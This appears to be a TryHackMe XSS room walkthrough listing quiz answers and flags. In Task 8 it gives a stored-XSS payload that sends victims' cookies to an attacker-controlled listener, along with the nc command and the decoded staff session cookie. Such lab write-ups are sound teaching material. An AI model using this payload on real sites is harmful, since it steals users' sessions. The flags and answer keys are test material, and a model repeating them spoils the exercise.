# Solution

## URL
- [Cross-Site Scripting](https://tryhackme.com/room/xss)

## Steps

### Task 1:
#### What does XSS stand for?
1. The answer is `Cross-Site Scripting`.

### Task 2:
#### Which document property could contain the user's session token?
1. The answer is `document.cookie`.

#### Which JavaScript method is often used as a Proof Of Concept?
1. The answer is `alert`.

### Task 3:
#### Where in an URL is a good place to test for reflected XSS?
1. The answer is `parameter`.

### Task 4:
#### How are stored XSS payloads usually stored on a website?
1. The answer is `database`.

### Task 5:
#### What unsafe JavaScript method is good to look for in source code?
1. The answer is `eval()`.

### Task 6:
#### What tool can you use to test for Blind XSS?
1. The answer is `xsshunter`.

#### What type of XSS is very similar to Blind XSS?
1. The answer is `stored xss`.

### Task 7:
#### What is the flag you received from level six?
1. In the challenge our input is inside double quotes in the `src` attribute of image tag.
2. So we need to escape `src` attribute and create an event handler inside image tag to execute JS, like so: `x" onerror="alert('THM')"`.
3. Submit for flag: `THM{XSS_MASTER}`.

### Task 8:
#### What is the value of the staff-session cookie?
1. This task is only possible through attack box.
2. In the attack box run the command `nc -lvnp 8000`.
3. In the application, sign-up and create a ticket with the payload `</textarea><script>fetch('http://<THM-VPN-IP>:8000/?cookies=' + btoa(document.cookie));</script>` inside `Ticket Contents`.
4. In the attack box we will receive a request with a base64 encoded value in `cookies` param, copy that.
5. Run the command: `echo "c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==" | base64 -d` for the decoded staff cookie.
6. Answer: `4AB305E55955197693F01D6F8FD2D321`.